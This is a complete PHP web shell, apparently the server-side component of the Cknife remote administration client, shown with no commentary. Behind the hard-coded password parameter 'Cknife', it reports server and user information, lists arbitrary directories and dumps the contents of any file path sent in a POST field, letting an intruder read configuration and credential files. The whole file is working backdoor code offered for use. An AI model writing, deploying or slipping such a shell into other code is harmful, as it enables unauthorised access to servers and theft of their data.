<?php
$pwd = 'Cknife';
if ($_POST [$pwd] == 1) {
	$act = $_POST ['action'];
	echo ("->|");
	if ($act == 'index') {
		$D = dirname ( $_SERVER ["SCRIPT_FILENAME"] );
		if ($D == "")
			$D = dirname ( $_SERVER ["PATH_TRANSLATED"] );
		$R = "{$D}\t";
		if (substr ( $D, 0, 1 ) != "/") {
			foreach ( range ( "A", "Z" ) as $L )
				if (is_dir ( "{$L}:" ))
					$R .= "{$L}:";
		}
		$R .= "\t";
		$u = (function_exists ( 'posix_getegid' )) ? @posix_getpwuid ( @posix_geteuid () ) : '';
		$usr = ($u) ? $u ['name'] : @get_current_user ();
		$R .= php_uname ();
		$R .= "({$usr})";
		print $R;
	} else if ($act == 'readdict') {
		$D =  $_POST ["z1"] ;
		$F = @opendir ( $D );
		if ($F == NULL) {
			echo ("ERROR:// Path Not Found Or No Permission!");
		} else {
			$M = NULL;
			$L = NULL;
			while ( $N = @readdir ( $F ) ) {
				$P = $D . "/" . $N;
				$T = @date ( "Y-m-d H:i:s", @filemtime ( $P ) );
				@$E = substr ( base_convert ( @fileperms ( $P ), 10, 8 ), - 4 );
				$R = "\t" . $T . "\t" . @filesize ( $P ) . "\t" . $E . "
";
				if (@is_dir ( $P ))
					$M .= $N . "/" . $R;
				else
					$L .= $N . $R;
			}
			echo $M . $L;
			@closedir ( $F );
		}
	} else if ($act =='readfile')
	{
		$F = $_POST ["z1"];
		$P = @fopen ( $F, "r" );
		echo (@fread ( $P, filesize ( $F ) ));
		@fclose ( $P );
	}
	echo ("|<-");
}
?>